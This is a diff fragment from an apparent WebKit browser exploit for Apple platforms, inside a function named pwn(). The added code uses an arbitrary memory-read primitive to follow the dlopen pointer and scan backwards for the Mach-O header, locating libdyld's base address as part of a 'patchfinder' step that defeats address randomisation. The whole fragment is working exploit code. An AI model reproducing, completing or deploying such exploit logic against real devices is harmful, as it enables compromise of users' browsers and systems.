@@ -294,6 +294,28 @@ function pwn() {
     var dlopen_ptr = follow_adrpLdr(dlopen_addr);
     log(`[+] dlopen_ptr: ${dlopen_ptr}`);
 
+    var libdyld_dlopen_addr = read64(dlopen_ptr);
+    log(`[+] libdyld_dlopen_addr: ${libdyld_dlopen_addr}`);
+
+    var libdyld_base = Sub(libdyld_dlopen_addr, libdyld_dlopen_addr.lo() & 0xfff);
+    try_count = 0;
+    while (true) {
+        if(try_count > 0x100) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        machoMagic = read64(libdyld_base);
+
+        if(machoMagic == 0x100000CFEEDFACF) {
+            break;
+        }
+        libdyld_base = Sub(libdyld_base, 0x1000);
+        try_count++;
+    }
+    log(`[+] libdyld_base: ${libdyld_base}`);
+
+
 
 
     // remove this "return" if finished patchfinder
